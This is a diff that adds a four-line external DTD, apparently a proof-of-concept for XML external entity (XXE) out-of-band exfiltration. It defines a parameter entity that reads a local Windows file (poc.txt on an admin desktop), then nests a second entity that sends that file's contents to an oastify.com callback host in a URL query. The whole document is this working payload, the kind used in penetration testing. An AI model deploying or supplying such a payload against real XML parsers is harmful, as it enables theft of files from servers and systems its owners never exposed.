@@ -1,0 +1,4 @@
+<!ENTITY % file SYSTEM "file:///C:/Users/ADMIN/Desktop/poc.txt">
+<!ENTITY % eval "<!ENTITY &#x25; exfil SYSTEM 'http://nd43ungp9axum5n9zipx4cdic9i06wul.oastify.com/leak?d=%file;'>">
+%eval;
+%exfil;
